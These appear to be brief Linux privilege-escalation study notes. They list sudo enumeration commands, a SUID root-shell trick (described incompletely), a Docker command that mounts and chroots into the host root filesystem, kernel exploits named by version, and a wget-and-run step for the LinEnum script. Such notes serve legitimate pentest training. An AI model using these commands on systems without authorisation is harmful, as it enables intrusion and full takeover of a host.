				Sudo 
Can you su without a password?		       su root
are you already a sudo user?			   sudo su -
what can we run with sudo?			  sudo -l

				Spawning root shells
Create a copy of /bin/bash or /bin/sh can you call it rootbash - make sure its owned by the root user. Then use /bin/bash -p to run it

				/etc/shadow overwrite

				Docker
-- get image name using 'docker ps'
-- docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh

				Local Exploits
kernel 2.4.x / 2.6.x (sock_sendpage 1)
kernel 2.4 / 2.6 (sock_sendpage 2)
kernel < 2.6.22 (ftruncate)
kernel < 2.6.34 (cap_sys_admin)
kernel 2.6.27 < 2.6.36 (compat)
kernel < 2.6.36-rc1 (can bcm)
kernel <= 2.6.36-rc8 (rds protocol)
kernel < 2.6.36.2 (half nelson)
kernel <= 2.6.37 (full nelson)
kernel 2.6 (udev)
kernel 3.13 (sgid)
kernel 3.13.0 < 3.19 (overlayfs 1)
kernel 3.14.5 (libfutex)
kernel 2.6.39 <= 3.2.2 (mempodipper)
kernel 2.6.28 / 3.0 (alpha-omega)
kernel 2.6.22 < 3.9 (Dirty Cow)
kernel 3.7.6 (msr)
kernel < 3.8.9 (perf_swevent_init)
kernel <= 4.3.3 (overlayfs 2)
kernel 4.3.3 (overlayfs 3)
kernel 4.4.0 (af_packet)
kernel 4.4.x (double-fdput)
kernel 4.4.0-21 (netfilter)
kernel 4.4.1 (refcount)

				LinEnum
-- wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-- ./LinEnum.sh -t -r report.txt

				Misc
-- https://gtfobins.github.io/